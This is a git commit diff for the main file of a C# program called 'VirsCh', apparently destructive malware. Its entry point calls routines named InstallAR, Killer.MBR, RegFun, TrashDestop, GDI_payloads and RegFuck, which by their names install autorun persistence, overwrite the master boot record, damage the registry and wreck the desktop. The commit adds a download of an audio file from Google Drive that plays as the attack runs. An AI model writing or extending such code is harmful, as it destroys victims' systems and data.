4fc341026de3ae78d429796bbd8e0dcf51ecfabc
DublikuntMax <dublikunt@gmail.com>
2022-03-05 12:59:58 +0200

    Прервый релиз (1.0.0.3)

--- VirsCh/Program.cs
+++ VirsCh/Program.cs
@@ -1,4 +1,6 @@
-﻿using System.Threading;
+﻿using System.IO;
+using System.Media;
+using System.Threading;
 
 namespace VirsCh
 {
@@ -6,12 +8,26 @@ namespace VirsCh
     {
         static void Main()
         {
+
             if (!Addition.IsInstalledAR())
                 Addition.InstallAR();
             Killer.MBR();
             Addition.RegFun();
+
+            if (File.Exists(@"C:\Users\Public\Downloads\BG.wav"))
+            {
+                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
+                back_snd.Play();
+            } else
+            {
+                Misc.DownloadFileUrl("https://drive.google.com/uc?export=download&id=1hEGfM2a3CI__Zb1E9ra9o-Rk4UB_VG4J",
+                "C:\\Users\\Public\\Downloads\\BG.wav");
+                SoundPlayer back_snd = new SoundPlayer(@"C:\Users\Public\Downloads\BG.wav");
+                back_snd.Play();
+            }
+
             var rule = new Rules();
-            rule.ShowDialog();
+            new Thread(() => rule.ShowDialog()).Start();
             new Thread(() => Addition.TrashDestop()).Start();
             new Thread(() => Effect.GDI_payloads()).Start();
             Killer.RegFuck();
